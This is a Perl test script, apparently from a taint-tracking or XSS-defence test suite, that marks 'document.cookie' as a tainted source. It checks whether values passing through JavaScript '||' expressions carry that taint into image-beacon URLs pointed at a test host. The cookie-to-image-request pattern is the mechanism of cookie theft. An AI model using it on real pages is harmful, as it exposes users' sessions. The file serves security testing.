#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_OR";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq~
    <script type="text/javascript">

		var evil = 3;
		if ($evil) {
			evil = 0;
		}
		var notevil = 0;
		var notevil2 = 0;
		var notevil3 = 0;

		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;
		
		// shouldn't be evil 

		dut = 0 || notevil || 3;		
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			dut2 = 0 || notevil2 || 4;
		}
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		notevil3 = evil;
		dut3 = 0 || notevil3 || 5;
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
~;

require "xss_basic_footer.pl";